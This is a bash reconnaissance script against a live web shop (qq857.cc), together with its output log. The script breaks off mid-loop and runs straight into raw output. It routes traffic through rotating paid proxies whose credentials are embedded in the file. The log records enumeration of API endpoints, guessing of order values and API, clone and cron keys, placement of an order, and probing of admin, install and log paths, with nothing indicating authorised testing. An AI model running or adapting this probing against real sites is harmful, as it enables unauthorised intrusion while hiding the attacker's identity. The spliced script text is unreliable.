#!/bin/bash
# qq857.cc/shop — SUCCESS_CASES + P1/P2
set -u
PROXY_URL=""
KEY=C413ED6D; PW=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://qq857.cc/shop
ROOT=https://qq857.cc
OUT=/tmp/qq857_out; CK=/tmp/qq857.ck; LOG=/tmp/qq857_recon.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception: print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PW}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 8 --max-time 30 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" "$@"; }
cj(){ c -H 'X-Requested-With: XMLHttpRequest' "$@"; }

for i in 1 2 3 4 5 6 7 8; do
{"code":"SUCCESS","data":[{"proxy_ip":"60.167.20.11","server":"60.167.20.11:16513","area_code":340200,"area":"安徽省芜湖市","isp":"电信","deadline":"2026-08-03 12:21:03"}],"request_id":"2db3e5
PROXY=http://C413ED6D:344F550A6F8B@123.189.59.16:14398
WARM=200
===== DNS =====
154.12.22.248   qq857.cc
===== fingerprint =====
len 33357
title 自动发卡
assets/faka => ['assets/faka']
csrf_token => ['csrf_token']
@[A-Za-z0-9_]{4,} => ['@aashun66', '@Sm6688_bot', '@media', '@keyframes']
===== getcount / api =====
{"code":0,"yxts":276,"orders":"254","orders1":"254","orders2":"21","money":84385,"money1":7705,"site":"15","gift":null,"cart_count":"0"}
--- siteinfo ---
{"sitename":"\u81ea\u52a8\u53d1\u5361","kfqq":"123456","anounce":"<p style=\"text-align:center;\">\r\n\t<span style=\"background-color:#FFE500;\"><span style=\"font-size:18px;\">1.\u552e\u540e\u95ee\u9898\u53ef\u76f4\u63a5\u8054\u7cfb\u5e73\u53f0\u5728\u7ebf\u5ba2\u670d<\/span><br \/>\r\n<\/span><span style=\"background-color:#FFE500;\"><span style=\"font-size:18px;\">2.\u770b\u5b8c\u5546\u54c1\u7
--- classlist ---
{"code":0,"msg":"succ","data":[{"cid":"1","zid":"1","pid":"0","sort":"1","name":"\u79c1\u4eba\u626b\u7801\u8001\u53f7-\u53ef\u4e0a\u5b89\u5353\u624b\u673a-\u53ef\u52a0\u4eba\u52a0\u7fa4-\u8f6f\u4ef6\u5df2\u67e5\u767e\u5206\u767e\u6709\u7801\u3011","shopimg":null,"block":null,"blockpay":null,"active":"1"},{"cid":"3","zid":"1","pid":"0","sort":"3","name":"\u8d26\u53f7\u53d1\u7ed9\u673a\u5668\u4eba\u
--- goodslist ---
{"code":0,"data":[{"tid":"6","cid":"1","name":"\u3010\u53ef\u4e0a\u624b\u673a-\u8bbe\u5907\u4e0d\u5e72\u51c0\u5c31\u4f1a\u6389\u7801\uff0c\u6389\u7801\u626bpc\u4f7f\u7528\uff0c\u4ecb\u610f\u52ff\u62cd\u3011\u5355\u592a","shopimg":"","close":"0","price":"75.00","isfaka":1,"stock":"3"},{"tid":"7","cid":"1","name":"\u3010\u53ef\u4e0a\u624b\u673a-\u8bbe\u5907\u4e0d\u5e72\u51c0\u5c31\u4f1a\u6389\u7801\
api.php => {"sitename":"\u81ea\u52a8\u53d1\u5361","kfqq":"123456","anounce":"<p style=\"text-align:center;\">\r\n\t<span style=\"ba
===== SUCCESS qd93 =====
data=1 HTTP=200 showOrder=0 faka=0 empty=True
data=2 HTTP=200 showOrder=0 faka=0 empty=True
data=0 HTTP=200 showOrder=0 faka=0 empty=False
data=00 HTTP=200 showOrder=0 faka=0 empty=True
data=01 HTTP=200 showOrder=0 faka=0 empty=True
data=12 HTTP=200 showOrder=0 faka=0 empty=True
data=88 HTTP=200 showOrder=0 faka=0 empty=True
data=99 HTTP=200 showOrder=0 faka=0 empty=True
data=2026 HTTP=200 showOrder=0 faka=0 empty=True
data=202608 HTTP=200 showOrder=0 faka=0 empty=True
data=138 HTTP=200 showOrder=0 faka=0 empty=True
data=150 HTTP=200 showOrder=0 faka=0 empty=True
data=188 HTTP=200 showOrder=0 faka=0 empty=True
data=857 HTTP=200 showOrder=0 faka=0 empty=True
===== SUCCESS 79yj search =====
search 1 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
search 10 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
search 100 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
search 500 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
search 1000 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
search 2000 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
search 5000 => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}
api.php search => {"code":-1,"message":"请提供用户登录信息或API对接密钥"}|200
===== SUCCESS YKFAKA =====
https://qq857.cc/Get_Yk_KC.html?gid=1 => 404
https://qq857.cc/Query_Km/1 => 404
https://qq857.cc/shop/Get_Yk_KC.html?gid=1 => 404
https://qq857.cc/shop/Query_Km/1 => 404
===== oracles =====
CSRF=6b6c732cacb728cd6cc6bd284306572b6dc218d75b645089db00de321c2017db
PROXY=http://C413ED6D:344F550A6F8B@221.225.217.159:16012
tools [] => {"code":-5,"msg":"确保各项不能为空"}
tools [x] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [test] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [123456] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [qq857] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
tools [admin] => {"code":-4,"msg":"API对接密钥错误，请在后台设置密钥"}
token => {"code":-1,"msg":"Invalid key"}
clone => {"code":-4,"msg":"克隆密钥错误"}
cron => 监控密钥不正确
card => {"code":-1,"msg":"此卡密不存在！"}
gift => {"code":-2,"msg":"网站未开启抽奖功能"}
===== goods / siteinfo =====
sitename 自动发卡 build 2025-11-01 kfqq 123456
tg ['@aashun66', '@Sm6688_bot']
Taddr []
goods 6
instock 6
6 75.00 3 【可上手机-设备不干净就会掉码，掉码扫pc使用，介意勿拍】单太
7 80.00 6 【可上手机-设备不干净就会掉码，掉码扫pc使用，介意勿拍】双太
8 85.00 62 【可上手机-设备不干净就会掉码，掉码扫pc使用，介意勿拍】三太
1 150.00 10 【可上手机-设备不干净就会掉码，掉码扫pc使用，介意勿拍】皇冠
9 150.00 3 【可上手机-设备不干净就会掉码，掉码扫pc使用，介意勿拍】太阳裙混合
10 180.00 8 【可上手机-设备不干净就会掉码，掉码扫pc使用，介意勿拍】皇裙
===== pay tid=6 =====
PROXY=http://C413ED6D:344F550A6F8B@222.139.246.33:17357
BUY:200
csrf True hs True len 30827
PAY={"code":0,"msg":"\u63d0\u4ea4\u8ba2\u5355\u6210\u529f\uff01","trade_no":"20260803121954951","need":null,"gn_usdt":"1","gm_usdt":"1","pay_alipay":"0","pay_wxpay":"0","pay_qqpay":"1","pay_rmb":null,"user_rmb":null,"paymsg":"<hr\/>\u5c0f\u63d0\u793a\uff1a<b style=\"color:red\">\u5982\u679c\u5fae\u4fe1\u51fa\u73b0\u65e0\u6cd5\u4ed8\u6b3e\u65f6\uff0c\u60a8\u53ef\u4ee5\u628a\u5fae\u4fe1\u7684\u94b1\u8f6c\u5230QQ\u91cc\uff0c\u7136\u540e\u4f7f\u7528QQ\u94b1\u5305\u652f\u4ed8\uff01<a href=\".\/?mod=wx\" target=\"_blank\">\u70b9\u51fb\u67e5\u770b\u6559\u7a0b<\/a><\/b>"}
TN=20260803121954951 INPUT=qq857121952
===== post-order =====
getshop => {"code":-1,"msg":"未付款"}
fake => {"code":-1,"msg":"未付款"}
usdt_closed True len 801
MCHID ['MCHID_NOT_EXIST]', 'MCHID_NOT_EXIST']
submit alipay closed True len 801
submit wxpay closed True len 801
ajax query HTTP200 {"code":0,"msg":"succ","content":"20260803121954951","page":1,"isnext":false,"islast":false,"data":[]}
ajax query HTTP200 {"code":0,"msg":"succ","content":"qq857121952","page":1,"isnext":false,"islast":false,"data":[]}
mod=query exact HTTP=200 SO [] empty True
===== login / paths =====
login:200
{"success":1,"gt":"a1017fd4951689c5d20317c165c1c318","challenge":"93365b7bc1e611330a4d9977fe5302a5","new_captcha":1}
https://qq857.cc/shop/admin/ => 404
https://qq857.cc/shop/install/ => 200
https://qq857.cc/shop/toollogs.php => 200
===== RECON DONE =====
